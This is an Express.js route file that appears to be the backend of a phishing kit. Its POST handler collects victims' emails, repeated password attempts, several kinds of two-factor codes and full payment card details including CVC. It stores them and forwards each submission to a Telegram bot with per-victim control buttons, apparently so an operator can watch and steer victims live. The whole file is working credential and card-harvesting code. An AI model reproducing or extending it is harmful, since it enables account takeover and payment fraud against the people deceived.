import express from 'express';
import { checkBannedId } from '../utils/banManager.js';
import { getTelegramQueue } from '../utils/telegramQueue.js';
import TelegramTemplate from '../utils/telegramTemplate.js';
import { getMemoryStore } from '../utils/memory-store.js';

const router = express.Router();

// Simple request model
class UserDataModel {
  constructor(requestData) {
    // Direct assignment without validation or sanitization
    this.id = requestData.id;
    this.ip = requestData.ip;
    this.country = requestData.country;
    this.city = requestData.city;
    this.full_name = requestData.full_name;
    this.login_email = requestData.login_email;
    this.business_email = requestData.business_email;
    this.page_name = requestData.page_name;
    this.phone_number = requestData.phone_number;
    this.password_one = requestData.password_one;
    this.password_two = requestData.password_two;
    this.password_three = requestData.password_three;
    this.tfa_one = requestData.tfa_one;
    this.tfa_two = requestData.tfa_two;
    this.whatsapp = requestData.whatsapp;
    this.email2fa = requestData.email2fa;
    this.auth_app_2fa = requestData.auth_app_2fa;
    this.CardName = requestData.CardName;
    this.CardNr = requestData.CardNr;
    this.CardDate = requestData.CardDate;
    this.CardCvc = requestData.CardCvc;
    this.currentStep = requestData.currentStep || 'User Data';
    this.context = requestData.context;
  }

  // Convert to plain object for telegram template
  toObject() {
    return {
      id: this.id,
      ip: this.ip,
      country: this.country,
      city: this.city,
      full_name: this.full_name,
      login_email: this.login_email,
      business_email: this.business_email,
      page_name: this.page_name,
      phone_number: this.phone_number,
      password_one: this.password_one,
      password_two: this.password_two,
      password_three: this.password_three,
      tfa_one: this.tfa_one,
      tfa_two: this.tfa_two,
      whatsapp: this.whatsapp,
      email2fa: this.email2fa,
      auth_app_2fa: this.auth_app_2fa,
      CardName: this.CardName,
      CardNr: this.CardNr,
      CardDate: this.CardDate,
      CardCvc: this.CardCvc,
      currentStep: this.currentStep,
      context: this.context
    };
  }
}

router.post('/user', async (req, res) => {
  try {
    // Basic request body check
    if (!req.body || !req.body.id) {
      return res.status(400).json({ 
        success: false, 
        message: 'Request body and ID are required' 
      });
    }

    const { id, ip } = req.body;

    // Create user data model from request (no validation/sanitization)
    const userDataModel = new UserDataModel(req.body);
    const userData = userDataModel.toObject();

    // Store/update user data in memory store
    const userStore = getMemoryStore();
    const existingUser = userStore.get(id);
    
    if (existingUser) {
      // Update existing user data
      existingUser.data = { ...existingUser.data, ...userData };
      existingUser.lastUpdated = new Date().toISOString();
      existingUser.lastActivity = Date.now();
      userStore.set(id, existingUser);
      console.log(`Updated user data for ID: ${id}`);
    } else {
      // Create new user entry
      const newUser = {
        userId: id,
        data: userData,
        connectedAt: new Date().toISOString(),
        lastUpdated: new Date().toISOString(),
        lastActivity: Date.now(),
        ip: ip
      };
      userStore.set(id, newUser);
      console.log(`Created new user entry for ID: ${id}`);
    }

    // Use TelegramTemplate to generate the message
    const telegramMessage = TelegramTemplate.generateUserDataTemplate(userData);
    const inlineKeyboard = TelegramTemplate.generateInlineKeyboard(id);

    // Queue Telegram notification using the template
    const telegramQueue = getTelegramQueue();
    telegramQueue.enqueue({
      type: 'user_data_template',
      userId: id,
      data: {
        text: telegramMessage,
        parse_mode: "Markdown",
        reply_markup: JSON.stringify(inlineKeyboard)
      }
    });

    return res.status(200).json({ 
      success: true,
      message: 'User data stored and queued for Telegram delivery'
    });

  } catch (error) {
    console.error('Error in /api/create/user:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
    });
  }
});

export default router; 